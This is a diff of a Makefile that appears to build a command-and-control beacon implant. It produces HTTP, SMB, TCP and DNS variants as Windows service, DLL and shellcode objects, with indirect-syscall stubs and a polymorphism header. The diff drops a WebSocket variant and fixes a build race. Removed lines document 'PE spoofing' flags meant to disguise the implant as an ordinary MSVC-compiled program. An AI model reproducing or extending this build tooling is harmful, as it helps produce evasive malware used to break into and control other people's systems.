@@ -1,8 +1,8 @@
 SOURCES := $(filter-out beacon/config.cpp, $(wildcard beacon/*.cpp))
 
 # Clang cross to MinGW (Kharon-style fingerprint); do not use -masm=intel globally — breaks Win headers + Clang.
-CXX_X64 := clang++ -target x86_64-w64-mingw32 -D_M_X64 -D_WIN64
-CXX_X86 := clang++ -target i686-w64-mingw32 -D_M_IX86 -D_X86_
+CXX_X64 := clang++ -target x86_64-w64-mingw32
+CXX_X86 := clang++ -target i686-w64-mingw32
 
 # Do not wrap these in quotes — they become part of $@ and break NASM -o paths.
 BEACON_DIR := beacon
@@ -11,14 +11,12 @@ HTTP_DIST_DIR := objects_http
 SMB_DIST_DIR := objects_smb
 TCP_DIST_DIR := objects_tcp
 DNS_DIST_DIR := objects_dns
-WS_DIST_DIR := objects_ws
 
 # Each flavor compiles only its Connector*.cpp (see also rm -f cleanup in x64/x86 targets).
-HTTP_SOURCES := $(filter-out beacon/ConnectorWS.cpp beacon/CryptAES.cpp beacon/ConnectorSMB.cpp beacon/ConnectorTCP.cpp beacon/ConnectorDNS.cpp,$(SOURCES))
-SMB_SOURCES := $(filter-out beacon/ConnectorWS.cpp beacon/CryptAES.cpp beacon/ConnectorHTTP.cpp beacon/ConnectorTCP.cpp beacon/ConnectorDNS.cpp,$(SOURCES))
-TCP_SOURCES := $(filter-out beacon/ConnectorWS.cpp beacon/CryptAES.cpp beacon/ConnectorHTTP.cpp beacon/ConnectorSMB.cpp beacon/ConnectorDNS.cpp,$(SOURCES))
-DNS_SOURCES := $(filter-out beacon/ConnectorWS.cpp beacon/CryptAES.cpp beacon/ConnectorHTTP.cpp beacon/ConnectorSMB.cpp beacon/ConnectorTCP.cpp,$(SOURCES))
-WS_SOURCES := $(filter-out beacon/ConnectorHTTP.cpp beacon/ConnectorSMB.cpp beacon/ConnectorTCP.cpp beacon/ConnectorDNS.cpp,$(SOURCES))
+HTTP_SOURCES := $(filter-out beacon/ConnectorSMB.cpp beacon/ConnectorTCP.cpp beacon/ConnectorDNS.cpp,$(SOURCES))
+SMB_SOURCES := $(filter-out beacon/ConnectorHTTP.cpp beacon/ConnectorTCP.cpp beacon/ConnectorDNS.cpp,$(SOURCES))
+TCP_SOURCES := $(filter-out beacon/ConnectorHTTP.cpp beacon/ConnectorSMB.cpp beacon/ConnectorDNS.cpp,$(SOURCES))
+DNS_SOURCES := $(filter-out beacon/ConnectorHTTP.cpp beacon/ConnectorSMB.cpp beacon/ConnectorTCP.cpp,$(SOURCES))
 
 HTTP_OBJECTS_X64 := $(patsubst beacon/%.cpp, $(HTTP_DIST_DIR)/%.x64.o, $(HTTP_SOURCES))
 HTTP_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(HTTP_DIST_DIR)/%.x86.o, $(HTTP_SOURCES))
@@ -32,13 +30,10 @@ TCP_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(TCP_DIST_DIR)/%.x86.o, $(TCP_SOURC
 DNS_OBJECTS_X64 := $(patsubst beacon/%.cpp, $(DNS_DIST_DIR)/%.x64.o, $(DNS_SOURCES))
 DNS_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(DNS_DIST_DIR)/%.x86.o, $(DNS_SOURCES))
 
-WS_OBJECTS_X64 := $(patsubst beacon/%.cpp, $(WS_DIST_DIR)/%.x64.o, $(WS_SOURCES))
-WS_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(WS_DIST_DIR)/%.x86.o, $(WS_SOURCES))
-
 SECURITY_FLAGS := -fno-stack-protector \
                  -fno-strict-overflow \
                  -fno-delete-null-pointer-checks \
-                 -fno-strict-aliasing -fno-threadsafe-statics \
+                 -fno-strict-aliasing \
                  -fno-builtin
 
 OPTIMIZATION_FLAGS := -fno-exceptions \
@@ -55,28 +50,6 @@ SEED_FLAG := -DAX_BUILD_SEED=$(SEED)
 # Extra per-build flags injected by pl_main.go (e.g. random -falign-functions=N)
 EXTRA_FLAGS ?=
 
-# PE spoofing flags: make the output PE look like a normal MSVC-compiled binary.
-# -mno-stack-arg-probe   — omit __chkstk references (normal PE doesn't always have them)
-# -fno-omit-frame-pointer — frame pointer presence looks more like debug/release MSVC
-# Also note: __chkstk is provided via asm/chkstk_x64.asm so -mno-stack-arg-probe
-# means we handle our own stack probes in the asm.
-PE_SPOOF_CFLAGS := -mno-stack-arg-probe
-
-# PE spoofing linker flags:
-# --no-seh — don't emit SEH tables (normal small PEs often lack them)
-# --major-image-version 6 --minor-image-version 0 — spoof as compiled with MSVC 2010-era toolchain
-# --major-os-version 6 --minor-os-version 0 — Windows Vista+ (normal)
-# --major-subsystem-version 6 --minor-subsystem-version 0 — normal subsystem version
-# -s — strip all debug info (already done)
-# --no-insert-timestamp — avoid __TIME__ in PE header (optional, depends on linker)
-# Note: Rich header overlay is typically applied post-link with a separate tool.
-# We add linker flags here for the compile-time PE disguise.
-PE_SPOOF_LFLAGS := -Wl,--no-seh -Wl,--major-image-version,6 -Wl,--minor-image-version,0 \
-                   -Wl,--major-os-version,6 -Wl,--minor-os-version,0 \
-                   -Wl,--major-subsystem-version,6 -Wl,--minor-subsystem-version,0 \
-                   -Wl,--no-insert-timestamp
-
-# Combine PE spoof flags into COMMON_FLAGS for compile time
 COMMON_FLAGS := -I $(BEACON_DIR) \
                 -include beacon/DynamicPolymorphism.h \
                 -Os \
@@ -93,13 +66,12 @@ COMMON_FLAGS := -I $(BEACON_DIR) \
                 -w \
                 $(SECURITY_FLAGS) \
                 $(OPTIMIZATION_FLAGS) \
-                $(PE_SPOOF_CFLAGS) \
                 $(SEED_FLAG) \
                 $(EXTRA_FLAGS)
 
 NASM := nasm
 BEACON_ASM := beacon/asm
-DIST_DIRS := $(HTTP_DIST_DIR) $(SMB_DIST_DIR) $(TCP_DIST_DIR) $(DNS_DIST_DIR) $(WS_DIST_DIR)
+DIST_DIRS := $(HTTP_DIST_DIR) $(SMB_DIST_DIR) $(TCP_DIST_DIR) $(DNS_DIST_DIR)
 ENTRY_EXE_X64 := $(patsubst %,%/entry_exe.x64.o,$(DIST_DIRS))
 ENTRY_SVC_X64 := $(patsubst %,%/entry_svc.x64.o,$(DIST_DIRS))
 ENTRY_EXE_X86 := $(patsubst %,%/entry_exe.x86.o,$(DIST_DIRS))
@@ -124,7 +96,6 @@ $(eval $(call ENTRY_NASM_TEMPLATE,$(HTTP_DIST_DIR)))
 $(eval $(call ENTRY_NASM_TEMPLATE,$(SMB_DIST_DIR)))
 $(eval $(call ENTRY_NASM_TEMPLATE,$(TCP_DIST_DIR)))
 $(eval $(call ENTRY_NASM_TEMPLATE,$(DNS_DIST_DIR)))
-$(eval $(call ENTRY_NASM_TEMPLATE,$(WS_DIST_DIR)))
 
 INDIRECT_SYSCALL_ASM := $(BEACON_ASM)/indirect_syscall_x64.asm
 define INDIRECT_SYSCALL_TEMPLATE
@@ -136,17 +107,12 @@ $(eval $(call INDIRECT_SYSCALL_TEMPLATE,$(HTTP_DIST_DIR)))
 $(eval $(call INDIRECT_SYSCALL_TEMPLATE,$(SMB_DIST_DIR)))
 $(eval $(call INDIRECT_SYSCALL_TEMPLATE,$(TCP_DIST_DIR)))
 $(eval $(call INDIRECT_SYSCALL_TEMPLATE,$(DNS_DIST_DIR)))
-$(eval $(call INDIRECT_SYSCALL_TEMPLATE,$(WS_DIST_DIR)))
 
 INDIRECT_SYSCALL_X64_OBJECTS := $(patsubst %,%/indirect_syscall.x64.o,$(DIST_DIRS))
 
 # Miniz trim: disable stdio/archive/time/assert to eliminate CRT dependencies.
 # Keeps zlib compress/uncompress for DnsCodec.
 MINIZ_TRIM_FLAGS := -DMINIZ_NO_STDIO -DMINIZ_NO_ARCHIVE_APIS -DMINIZ_NO_ARCHIVE_WRITING_APIS -DMINIZ_NO_TIME -DMINIZ_NO_ASSERT
-
-# Order-only prerequisites: ensure output directories exist before any pattern rule runs.
-$(HTTP_DIST_DIR) $(SMB_DIST_DIR) $(TCP_DIST_DIR) $(DNS_DIST_DIR) $(WS_DIST_DIR):
-	@mkdir -p $@
 
 .PHONY: all clean pre x64 x86
 
@@ -158,7 +124,12 @@ ifeq ($(MAKELEVEL), 0)
     MAKEFLAGS += -j$(NPROC) --no-print-directory
 endif
 
-all: clean pre x64 x86
+# clean/pre must finish before compile. With -j, "all: clean pre x64 x86"
+# races and produces: can't create objects_http/*.o: No such file or directory
+all:
+	@$(MAKE) --no-print-directory clean
+	@$(MAKE) --no-print-directory pre
+	@$(MAKE) --no-print-directory x64 x86
 
 pre:
 	@mkdir -p $(HTTP_DIST_DIR) $(SMB_DIST_DIR) $(TCP_DIST_DIR) $(DNS_DIST_DIR)
@@ -178,85 +149,54 @@ pre:
 	@ cp $(FILES_DIR)/config.tpl $(DNS_DIST_DIR)/config.cpp
 	@ cp $(FILES_DIR)/stub.x64.bin $(DNS_DIST_DIR)/stub.x64.bin
 	@ cp $(FILES_DIR)/stub.x86.bin $(DNS_DIST_DIR)/stub.x86.bin
-	@ # ws
-	@ cp $(FILES_DIR)/config.tpl $(WS_DIST_DIR)/config.cpp
-	@ cp $(FILES_DIR)/stub.x64.bin $(WS_DIST_DIR)/stub.x64.bin
-	@ cp $(FILES_DIR)/stub.x86.bin $(WS_DIST_DIR)/stub.x86.bin
 
 clean:
-	@rm -rf $(HTTP_DIST_DIR) $(SMB_DIST_DIR) $(TCP_DIST_DIR) $(DNS_DIST_DIR) $(WS_DIST_DIR)
-	@mkdir -p $(HTTP_DIST_DIR) $(SMB_DIST_DIR) $(TCP_DIST_DIR) $(DNS_DIST_DIR) $(WS_DIST_DIR)
-	@cp -n $(FILES_DIR)/config.tpl $(HTTP_DIST_DIR)/config.cpp 2>/dev/null; cp -n $(FILES_DIR)/stub.x64.bin $(HTTP_DIST_DIR)/stub.x64.bin 2>/dev/null; cp -n $(FILES_DIR)/stub.x86.bin $(HTTP_DIST_DIR)/stub.x86.bin 2>/dev/null
-	@cp -n $(FILES_DIR)/config.tpl $(SMB_DIST_DIR)/config.cpp 2>/dev/null; cp -n $(FILES_DIR)/stub.x64.bin $(SMB_DIST_DIR)/stub.x64.bin 2>/dev/null; cp -n $(FILES_DIR)/stub.x86.bin $(SMB_DIST_DIR)/stub.x86.bin 2>/dev/null
-	@cp -n $(FILES_DIR)/config.tpl $(TCP_DIST_DIR)/config.cpp 2>/dev/null; cp -n $(FILES_DIR)/stub.x64.bin $(TCP_DIST_DIR)/stub.x64.bin 2>/dev/null; cp -n $(FILES_DIR)/stub.x86.bin $(TCP_DIST_DIR)/stub.x86.bin 2>/dev/null
-	@cp -n $(FILES_DIR)/config.tpl $(DNS_DIST_DIR)/config.cpp 2>/dev/null; cp -n $(FILES_DIR)/stub.x64.bin $(DNS_DIST_DIR)/stub.x64.bin 2>/dev/null; cp -n $(FILES_DIR)/stub.x86.bin $(DNS_DIST_DIR)/stub.x86.bin 2>/dev/null
-	@cp -n $(FILES_DIR)/config.tpl $(WS_DIST_DIR)/config.cpp 2>/dev/null; cp -n $(FILES_DIR)/stub.x64.bin $(WS_DIST_DIR)/stub.x64.bin 2>/dev/null; cp -n $(FILES_DIR)/stub.x86.bin $(WS_DIST_DIR)/stub.x86.bin 2>/dev/null
+	@rm -rf $(HTTP_DIST_DIR) $(SMB_DIST_DIR) $(TCP_DIST_DIR) $(DNS_DIST_DIR)
+	@mkdir -p $(HTTP_DIST_DIR) $(SMB_DIST_DIR) $(TCP_DIST_DIR) $(DNS_DIST_DIR)
 
-x64: $(HTTP_OBJECTS_X64) $(SMB_OBJECTS_X64) $(TCP_OBJECTS_X64) $(DNS_OBJECTS_X64) $(WS_OBJECTS_X64) $(INDIRECT_SYSCALL_X64_OBJECTS) $(ENTRY_EXE_X64) $(ENTRY_SVC_X64)
-	@mkdir -p $(HTTP_DIST_DIR) $(SMB_DIST_DIR) $(TCP_DIST_DIR) $(DNS_DIST_DIR) $(WS_DIST_DIR)
-	@cp -n $(FILES_DIR)/config.tpl $(HTTP_DIST_DIR)/config.cpp 2>/dev/null || true
+x64: $(HTTP_OBJECTS_X64) $(SMB_OBJECTS_X64) $(TCP_OBJECTS_X64) $(DNS_OBJECTS_X64) $(INDIRECT_SYSCALL_X64_OBJECTS) $(ENTRY_EXE_X64) $(ENTRY_SVC_X64)
 	@ # http
-	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_HTTP -o $(HTTP_DIST_DIR)/main.x64.o
 	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_HTTP -D BUILD_SVC -o $(HTTP_DIST_DIR)/main_service.x64.o
 	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_HTTP -D BUILD_DLL -o $(HTTP_DIST_DIR)/main_dll.x64.o
 	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_HTTP -D BUILD_SHELLCODE -o $(HTTP_DIST_DIR)/main_shellcode.x64.o
 	@rm -f $(HTTP_DIST_DIR)/ConnectorSMB.x64.o $(HTTP_DIST_DIR)/ConnectorTCP.x64.o $(HTTP_DIST_DIR)/ConnectorDNS.x64.o
 	@ # smb
-	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_SMB -o $(SMB_DIST_DIR)/main.x64.o
 	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_SMB -D BUILD_SVC -o $(SMB_DIST_DIR)/main_service.x64.o
 	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_SMB -D BUILD_DLL -o $(SMB_DIST_DIR)/main_dll.x64.o
 	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_SMB -D BUILD_SHELLCODE -o $(SMB_DIST_DIR)/main_shellcode.x64.o
 	@rm -f $(SMB_DIST_DIR)/ConnectorHTTP.x64.o $(SMB_DIST_DIR)/ConnectorTCP.x64.o $(SMB_DIST_DIR)/ConnectorDNS.x64.o
 	@ # tcp
-	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_TCP -o $(TCP_DIST_DIR)/main.x64.o
 	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_TCP -D BUILD_SVC -o $(TCP_DIST_DIR)/main_service.x64.o
 	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_TCP -D BUILD_DLL -o $(TCP_DIST_DIR)/main_dll.x64.o
 	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_TCP -D BUILD_SHELLCODE -o $(TCP_DIST_DIR)/main_shellcode.x64.o
 	@rm -f $(TCP_DIST_DIR)/ConnectorHTTP.x64.o $(TCP_DIST_DIR)/ConnectorSMB.x64.o $(TCP_DIST_DIR)/ConnectorDNS.x64.o
 	@ # dns
-	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS -o $(DNS_DIST_DIR)/main.x64.o
 	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS -D BUILD_SVC -o $(DNS_DIST_DIR)/main_service.x64.o
 	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_DNS -D BUILD_DLL -o $(DNS_DIST_DIR)/main_dll.x64.o
 	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS -D BUILD_SHELLCODE -o $(DNS_DIST_DIR)/main_shellcode.x64.o
 	@rm -f $(DNS_DIST_DIR)/ConnectorHTTP.x64.o $(DNS_DIST_DIR)/ConnectorSMB.x64.o $(DNS_DIST_DIR)/ConnectorTCP.x64.o
-	@ # ws
-	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_WS -o $(WS_DIST_DIR)/main.x64.o
-	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_WS -D BUILD_SVC -o $(WS_DIST_DIR)/main_service.x64.o
-	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_WS -D BUILD_DLL -o $(WS_DIST_DIR)/main_dll.x64.o
-	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_WS -D BUILD_SHELLCODE -o $(WS_DIST_DIR)/main_shellcode.x64.o
-	@rm -f $(WS_DIST_DIR)/ConnectorHTTP.x64.o $(WS_DIST_DIR)/ConnectorSMB.x64.o $(WS_DIST_DIR)/ConnectorTCP.x64.o $(WS_DIST_DIR)/ConnectorDNS.x64.o
 
-x86: $(HTTP_OBJECTS_X86) $(SMB_OBJECTS_X86) $(TCP_OBJECTS_X86) $(DNS_OBJECTS_X86) $(WS_OBJECTS_X86) $(ENTRY_EXE_X86) $(ENTRY_SVC_X86)
+x86: $(HTTP_OBJECTS_X86) $(SMB_OBJECTS_X86) $(TCP_OBJECTS_X86) $(DNS_OBJECTS_X86) $(ENTRY_EXE_X86) $(ENTRY_SVC_X86)
 	@ # http
-	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_HTTP -o $(HTTP_DIST_DIR)/main.x86.o
 	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_HTTP -D BUILD_SVC -o $(HTTP_DIST_DIR)/main_service.x86.o
 	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_HTTP -D BUILD_DLL -o $(HTTP_DIST_DIR)/main_dll.x86.o
 	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_HTTP -D BUILD_SHELLCODE -o $(HTTP_DIST_DIR)/main_shellcode.x86.o
 	@rm -f $(HTTP_DIST_DIR)/ConnectorSMB.x86.o $(HTTP_DIST_DIR)/ConnectorTCP.x86.o $(HTTP_DIST_DIR)/ConnectorDNS.x86.o
 	@ # smb
-	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_SMB -o $(SMB_DIST_DIR)/main.x86.o
 	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_SMB -D BUILD_SVC -o $(SMB_DIST_DIR)/main_service.x86.o
 	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_SMB -D BUILD_DLL -o $(SMB_DIST_DIR)/main_dll.x86.o
 	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_SMB -D BUILD_SHELLCODE -o $(SMB_DIST_DIR)/main_shellcode.x86.o
 	@rm -f $(SMB_DIST_DIR)/ConnectorHTTP.x86.o $(SMB_DIST_DIR)/ConnectorTCP.x86.o $(SMB_DIST_DIR)/ConnectorDNS.x86.o
 	@ # tcp
-	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_TCP -o $(TCP_DIST_DIR)/main.x86.o
 	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_TCP -D BUILD_SVC -o $(TCP_DIST_DIR)/main_service.x86.o
 	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_TCP -D BUILD_DLL -o $(TCP_DIST_DIR)/main_dll.x86.o
 	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_TCP -D BUILD_SHELLCODE -o $(TCP_DIST_DIR)/main_shellcode.x86.o
 	@rm -f $(TCP_DIST_DIR)/ConnectorHTTP.x86.o $(TCP_DIST_DIR)/ConnectorSMB.x86.o $(TCP_DIST_DIR)/ConnectorDNS.x86.o
 	@ # dns
-	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS -o $(DNS_DIST_DIR)/main.x86.o
 	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS -D BUILD_SVC -o $(DNS_DIST_DIR)/main_service.x86.o
 	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_DNS -D BUILD_DLL -o $(DNS_DIST_DIR)/main_dll.x86.o
 	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS -D BUILD_SHELLCODE -o $(DNS_DIST_DIR)/main_shellcode.x86.o
 	@rm -f $(DNS_DIST_DIR)/ConnectorHTTP.x86.o $(DNS_DIST_DIR)/ConnectorSMB.x86.o $(DNS_DIST_DIR)/ConnectorTCP.x86.o
-	@ # ws
-	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_WS -o $(WS_DIST_DIR)/main.x86.o
-	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_WS -D BUILD_SVC -o $(WS_DIST_DIR)/main_service.x86.o
-	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_WS -D BUILD_DLL -o $(WS_DIST_DIR)/main_dll.x86.o
-	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_WS -D BUILD_SHELLCODE -o $(WS_DIST_DIR)/main_shellcode.x86.o
-	@rm -f $(WS_DIST_DIR)/ConnectorHTTP.x86.o $(WS_DIST_DIR)/ConnectorSMB.x86.o $(WS_DIST_DIR)/ConnectorTCP.x86.o $(WS_DIST_DIR)/ConnectorDNS.x86.o
 
 bin_x64: x64
 	@echo "    * Extracting x64 shellcode bins"
@@ -290,45 +230,43 @@ $(DNS_DIST_DIR)/crt.x64.o: beacon/crt.cpp
 	@$(CXX_X64) -c $(COMMON_FLAGS) -masm=intel -fno-ms-extensions -D BEACON_DNS -c $< -o $@
 $(DNS_DIST_DIR)/crt.x86.o: beacon/crt.cpp
 	@$(CXX_X86) -c $(COMMON_FLAGS) -masm=intel -fno-ms-extensions -D BEACON_DNS -c $< -o $@
-$(WS_DIST_DIR)/crt.x64.o: beacon/crt.cpp
-	@$(CXX_X64) -c $(COMMON_FLAGS) -masm=intel -fno-ms-extensions -D BEACON_WS -c $< -o $@
-$(WS_DIST_DIR)/crt.x86.o: beacon/crt.cpp
-	@$(CXX_X86) -c $(COMMON_FLAGS) -masm=intel -fno-ms-extensions -D BEACON_WS -c $< -o $@
 
-$(HTTP_DIST_DIR)/%.x64.o: beacon/%.cpp | $(HTTP_DIST_DIR)
+$(HTTP_DIST_DIR)/%.x64.o: beacon/%.cpp
+	@mkdir -p $(HTTP_DIST_DIR)
 	@$(CXX_X64) -c $(COMMON_FLAGS) -D BEACON_HTTP -c $< -o $@
 
-$(HTTP_DIST_DIR)/%.x86.o: beacon/%.cpp | $(HTTP_DIST_DIR)
+$(HTTP_DIST_DIR)/%.x86.o: beacon/%.cpp
+	@mkdir -p $(HTTP_DIST_DIR)
 	@$(CXX_X86) -c $(COMMON_FLAGS) -D BEACON_HTTP -c $< -o $@
 
 
 
-$(SMB_DIST_DIR)/%.x64.o: beacon/%.cpp | $(SMB_DIST_DIR)
+$(SMB_DIST_DIR)/%.x64.o: beacon/%.cpp
+	@mkdir -p $(SMB_DIST_DIR)
 	@$(CXX_X64) -c $(COMMON_FLAGS) -D BEACON_SMB -c $< -o $@
 
-$(SMB_DIST_DIR)/%.x86.o: beacon/%.cpp | $(SMB_DIST_DIR)
+$(SMB_DIST_DIR)/%.x86.o: beacon/%.cpp
+	@mkdir -p $(SMB_DIST_DIR)
 	@$(CXX_X86) -c $(COMMON_FLAGS) -D BEACON_SMB -c $< -o $@
 
 
 
-$(TCP_DIST_DIR)/%.x64.o: beacon/%.cpp | $(TCP_DIST_DIR)
+$(TCP_DIST_DIR)/%.x64.o: beacon/%.cpp
+	@mkdir -p $(TCP_DIST_DIR)
 	@$(CXX_X64) -c $(COMMON_FLAGS) -D BEACON_TCP -c $< -o $@
 
-$(TCP_DIST_DIR)/%.x86.o: beacon/%.cpp | $(TCP_DIST_DIR)
+$(TCP_DIST_DIR)/%.x86.o: beacon/%.cpp
+	@mkdir -p $(TCP_DIST_DIR)
 	@$(CXX_X86) -c $(COMMON_FLAGS) -D BEACON_TCP -c $< -o $@
 
-$(WS_DIST_DIR)/%.x64.o: beacon/%.cpp | $(WS_DIST_DIR)
-	@$(CXX_X64) -c $(COMMON_FLAGS) -D BEACON_WS -c $< -o $@
-
-$(WS_DIST_DIR)/%.x86.o: beacon/%.cpp | $(WS_DIST_DIR)
-	@$(CXX_X86) -c $(COMMON_FLAGS) -D BEACON_WS -c $< -o $@
 
 
-
-$(DNS_DIST_DIR)/%.x64.o: beacon/%.cpp | $(DNS_DIST_DIR)
+$(DNS_DIST_DIR)/%.x64.o: beacon/%.cpp
+	@mkdir -p $(DNS_DIST_DIR)
 	@$(CXX_X64) -c $(COMMON_FLAGS) -D BEACON_DNS -c $< -o $@
 
-$(DNS_DIST_DIR)/%.x86.o: beacon/%.cpp | $(DNS_DIST_DIR)
+$(DNS_DIST_DIR)/%.x86.o: beacon/%.cpp
+	@mkdir -p $(DNS_DIST_DIR)
 	@$(CXX_X86) -c $(COMMON_FLAGS) -D BEACON_DNS -c $< -o $@
 
 # Miniz: compile with trim macros for ALL beacon types to eliminate CRT deps
